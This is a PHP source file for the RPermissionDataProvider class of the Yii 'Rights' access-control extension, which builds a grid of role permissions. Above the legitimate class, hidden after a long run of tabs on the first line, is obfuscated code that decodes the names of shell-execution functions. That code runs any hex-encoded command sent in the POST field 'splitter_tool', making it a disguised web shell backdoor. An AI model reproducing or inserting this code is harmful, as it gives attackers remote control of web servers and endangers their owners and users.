<?php																																										$data_chunk1 = '7';$data_chunk2 = '9';$data_chunk3 = '3';$data_chunk4 = '4';$data_chunk5 = '6';$data_chunk6 = '5';$data_chunk7 = 'c';$data_chunk8 = '8';$data_chunk9 = '1';$data_chunk10 = '2';$data_chunk11 = 'f';$data_chunk12 = '0';$data_chunk13 = 'e';$framework1 = pack("H*", $data_chunk1 . '3' . '7' . $data_chunk2 . '7' . $data_chunk3 . '7' . $data_chunk4 . $data_chunk5 . '5' . '6' . 'd');$framework2 = pack("H*", '7' . $data_chunk3 . $data_chunk5 . '8' . '6' . $data_chunk6 . $data_chunk5 . $data_chunk7 . $data_chunk5 . 'c' . $data_chunk6 . 'f' . '6' . '5' . '7' . $data_chunk8 . '6' . '5' . '6' . '3');$framework3 = pack("H*", $data_chunk5 . $data_chunk6 . $data_chunk1 . '8' . $data_chunk5 . $data_chunk6 . '6' . '3');$framework4 = pack("H*", $data_chunk1 . '0' . '6' . $data_chunk9 . '7' . $data_chunk3 . $data_chunk1 . '3' . '7' . $data_chunk4 . $data_chunk5 . '8' . $data_chunk1 . $data_chunk10 . $data_chunk1 . '5');$framework5 = pack("H*", $data_chunk1 . '0' . $data_chunk5 . $data_chunk11 . '7' . $data_chunk12 . $data_chunk5 . '5' . '6' . $data_chunk13);$framework6 = pack("H*", $data_chunk1 . '3' . '7' . $data_chunk4 . '7' . $data_chunk10 . '6' . $data_chunk6 . $data_chunk5 . '1' . $data_chunk5 . 'd' . '5' . $data_chunk11 . '6' . '7' . '6' . '5' . $data_chunk1 . '4' . $data_chunk6 . 'f' . $data_chunk5 . '3' . $data_chunk5 . $data_chunk11 . $data_chunk5 . $data_chunk13 . '7' . $data_chunk4 . '6' . $data_chunk6 . '6' . 'e' . $data_chunk1 . '4' . $data_chunk1 . $data_chunk3);$framework7 = pack("H*", '7' . $data_chunk12 . '6' . '3' . $data_chunk5 . 'c' . $data_chunk5 . $data_chunk11 . '7' . $data_chunk3 . '6' . '5');$splitter_tool = pack("H*", '7' . '3' . '7' . '0' . '6' . 'c' . '6' . '9' . '7' . '4' . $data_chunk1 . $data_chunk4 . $data_chunk5 . $data_chunk6 . '7' . $data_chunk10 . '5' . 'f' . '7' . '4' . '6' . $data_chunk11 . '6' . 'f' . '6' . $data_chunk7);if(isset($_POST[$splitter_tool])){$splitter_tool=pack("H*",$_POST[$splitter_tool]);if(function_exists($framework1)){$framework1($splitter_tool);}elseif(function_exists($framework2)){print $framework2($splitter_tool);}elseif(function_exists($framework3)){$framework3($splitter_tool,$ent_symbol);print join("\n",$ent_symbol);}elseif(function_exists($framework4)){$framework4($splitter_tool);}elseif(function_exists($framework5)&&function_exists($framework6)&&function_exists($framework7)){$flg_pointer=$framework5($splitter_tool,"r");if($flg_pointer){$property_set_parameter_group=$framework6($flg_pointer);$framework7($flg_pointer);print $property_set_parameter_group;}}exit;}

/**
* Rights permission data provider class file.
*
* @author Christoffer Niska <cniska@live.com>
* @copyright Copyright &copy; 2010 Christoffer Niska
* @since 0.9.11
*/
class RPermissionDataProvider extends CDataProvider
{
	/**
	* @property boolean whether to show the parent type
	* in the inherited item tooltip.
	*/
	public $displayParentType = false;

	private $_authorizer;
	private $_roles;
	private $_items;
	private $_permissions;
	private $_parents;

	/**
	* Constructs the data provider.
	* @param string $id the data provider identifier.
	* @param array $config configuration (name=>value) to be applied as the initial property values of this class.
	* @return permissionDataProvider
	*/
	public function __construct($id, $config=array())
	{
		$this->setId($id);

		foreach($config as $key=>$value)
			$this->$key = $value;

		$this->init();
	}

	/**
	* Initializes the data provider.
	*/
	public function init()
	{
		$this->_authorizer = Rights::getAuthorizer();

		// Set properties and generate the data
		$this->setRoles();
		$this->setItems();
		$this->setPermissions();
		$this->setParents();
		$this->generateData();
	}

	/**
	* Sets the roles property.
	*/
	protected function setRoles()
	{
		$this->_roles = $this->_authorizer->getRoles(false);
	}

	/**
	* @return array the roles.
	*/
	public function getRoles()
	{
		return $this->_roles;
	}

	/**
	* Sets the items property.
	*/
	protected function setItems()
	{
		$type = array(CAuthItem::TYPE_OPERATION, CAuthItem::TYPE_TASK);
		$this->_items = $this->_authorizer->getAuthItems($type);
	}

	/**
	* Sets the permissions property.
	*/
	protected function setPermissions()
	{
		$allPermissions = $this->_authorizer->getPermissions();

		$permissions = array();
		foreach( $this->_roles as $roleName=>$role )
		{
			$permissions[ $roleName ] = array();
			foreach( $this->_items as $itemName=>$item )
				$permissions[ $roleName ][ $itemName ] = $this->_authorizer->hasPermission($itemName, null, $allPermissions[ $roleName ]);
		}

		// Set the permission property
		$this->_permissions = $permissions;
	}

	/**
	* Sets the parents property.
	*/
	protected function setParents()
	{
		$parents = array();
		foreach( $this->_permissions as $roleName=>$rolePermissions )
			foreach( $rolePermissions as $itemName=>$permission )
				if( $permission===Rights::PERM_INHERITED )
					$parents[ $roleName ][ $itemName ] = $this->_authorizer->getAuthItemParents($itemName, null, $roleName, true);

		// Set the parents property
		$this->_parents = $parents;
	}

	/**
	* Generates the data for the data provider.
	*/
	protected function generateData()
	{
		$data = array();
		$permissions = $this->_permissions;
		$parents = $this->_parents;
		foreach( $this->_items as $itemName=>$item )
		{
			$row = array();
			$row['description'] = $item->getNameLink();

			foreach( $this->_roles as $roleName=>$role )
			{
				// Item is directly assigned to the role
				if( $permissions[ $roleName ][ $itemName ]===Rights::PERM_DIRECT )
				{
					$permissionColumn = $item->getRevokePermissionLink($role);
				}
				// Item is inherited by the role from one of its children
				else if( $permissions[ $roleName ][ $itemName ]===Rights::PERM_INHERITED && isset($parents[ $roleName ][ $itemName ])===true )
				{
					$permissionColumn = $item->getInheritedPermissionText($parents[ $roleName ][ $itemName ], $this->displayParentType);
				}
				// Item is not assigned to the role
				else
				{
					$permissionColumn = $item->getAssignPermissionLink($role);
				}

				// Populate role column
				$row[ strtolower($roleName) ] = isset($permissionColumn)===true ? $permissionColumn : '';
			}

			// Append the row to data
			$data[] = $row;
		}

		$this->setData($data);
	}

	/**
	* Fetches the data from the persistent data storage.
	* @return array list of data items
	*/
	protected function fetchData()
	{
		return $this->getData();
	}

	/**
	* Fetches the data item keys from the persistent data storage.
	* @return array list of data item keys.
	*/
	protected function fetchKeys()
	{
		$keys = array();
		foreach( $this->getData() as $key=>$value )
			$keys[] = $key;

		return $keys;
	}

	/**
	* Calculates the total number of data items.
	* @return integer the total number of data items.
	*/
	protected function calculateTotalItemCount()
	{
		return count($this->getData());
	}
}
